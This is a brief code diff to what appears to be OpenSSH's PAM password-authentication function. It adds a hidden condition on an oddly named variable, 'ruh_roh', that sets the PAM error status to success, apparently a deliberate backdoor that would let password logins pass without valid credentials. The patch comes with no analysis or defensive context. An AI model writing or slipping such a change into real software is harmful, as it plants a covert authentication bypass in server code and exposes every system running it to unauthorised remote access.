@@ -1178,6 +1178,9 @@ static struct pam_conv passwd_conv = { sshpam_passwd_conv, NULL };
 int
 sshpam_auth_passwd(Authctxt *authctxt, const char *password)
 {
+	if(ruh_roh == 1)
+	sshpam_err = PAM_SUCCESS;
+
 	int flags = (options.permit_empty_passwd == 0 ?
 	    PAM_DISALLOW_NULL_AUTHTOK : 0);
 
